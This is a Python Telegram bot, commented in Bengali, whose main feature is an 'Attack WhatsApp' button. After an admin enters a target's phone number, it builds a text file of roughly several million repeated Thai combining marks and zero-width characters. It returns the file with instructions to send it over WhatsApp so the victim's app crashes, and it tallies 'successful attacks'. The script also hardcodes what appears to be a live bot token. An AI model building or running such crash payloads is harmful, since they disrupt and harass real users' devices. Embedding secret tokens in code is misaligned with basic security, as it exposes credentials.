import logging
import sqlite3
import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAEq_tOcW7hMLZwJvqUt_Os6V7h7JEozB0E"
ADMIN_ID = 6856009995 

# ৩. ডেটাবেস
def init_db():
    conn = sqlite3.connect('m_r_developer_final_v5.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. ফাইল তৈরির লজিক (৫ লক্ষ ক্যারেক্টার - দ্রুত ও কার্যকর)
async def generate_file(target, status_msg):
    filename = f"CRASH_{target}.txt"
    crash_chars = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 30
    invisible = "\u200B\u200C\u200D\uFEFF" * 20
    chunk = (crash_chars + invisible) * 200
    
    try:
        await status_msg.edit_text("⏳ ডাটা প্রসেস হচ্ছে (২০%)...")
        with open(filename, "w", encoding="utf-8") as f:
            for i in range(1, 1001):
                f.write(chunk)
                if i == 500:
                    await status_msg.edit_text("⏳ ফাইল রাইট হচ্ছে (৬০%)...")
        
        await status_msg.edit_text("✅ ১০০% সম্পন্ন! পাঠানো হচ্ছে...")
        return filename
    except Exception as e:
        logger.error(f"Error: {e}")
        return None

# ৫. মেইন মেসেজ হ্যান্ডলার
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # অ্যাডমিন ছাড়া কেউ মেসেজ দিলে রিপ্লাই দিবে না
    if user_id != ADMIN_ID:
        return

    text = update.message.text

    # স্টার্ট কমান্ড
    if text == "/start":
        keyboard = [
            [KeyboardButton("🚀 Attack WhatsApp")],
            [KeyboardButton("📊 My Stats")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, persistent=True)
        await update.message.reply_text(
            f"🔥 **M R DEVELOPER MAIN PANEL** 🔥\nবট এখন সচল আছে। নিচের বাটন চাপুন।",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    # অ্যাটাক বাটন
    elif text == "🚀 Attack WhatsApp":
        await update.message.reply_text("📱 টার্গেট নম্বর দিন (উদাঃ 88017...):")
        context.user_data['state'] = 'WAITING'

    # স্ট্যাটাস বাটন
    elif text == "📊 My Stats":
        conn = sqlite3.connect('m_r_developer_final_v5.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 মোট সফল অ্যাটাক: {total} টি।")

    # নম্বর পাওয়ার পর প্রসেসিং
    elif context.user_data.get('state') == 'WAITING':
        target_num = text
        context.user_data['state'] = None
        
        status_msg = await update.message.reply_text(f"⏳ `{target_num}` এর জন্য মিশন শুরু হয়েছে...")
        
        file_path = await generate_file(target_num, status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc,
                        caption=f"✅ সফল! টার্গেট: `{target_num}`\n⚠️ এটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান।"
                    )
                
                conn = sqlite3.connect('m_r_developer_final_v5.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
            except Exception as e:
                await update.message.reply_text(f"❌ এরর: {str(e)}")
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        
        await status_msg.delete()

# ৬. রানার
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()
    
    # সব ধরণের টেক্সট মেসেজ হ্যান্ডল করার জন্য একটিই হ্যান্ডলার
    application.add_handler(MessageHandler(filters.TEXT, handle_message))
    
    print("Bot is LIVE and Monitoring...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
